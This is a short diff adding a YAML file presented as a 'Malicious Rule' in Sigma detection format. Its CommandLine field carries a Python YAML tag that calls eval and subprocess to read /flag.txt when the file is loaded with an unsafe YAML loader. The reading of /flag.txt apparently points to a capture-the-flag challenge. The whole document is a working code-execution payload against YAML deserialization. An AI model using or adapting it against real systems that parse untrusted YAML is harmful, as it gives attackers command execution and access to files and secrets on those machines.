@@ -1,0 +1,10 @@
+#### For yml/yaml code execution due to .load()
+title: Malicious Rule
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    CommandLine: !!python/object/apply:eval ["__import__('subprocess').check_output(['cat','/flag.txt'])"]
+  condition: selection
+#######
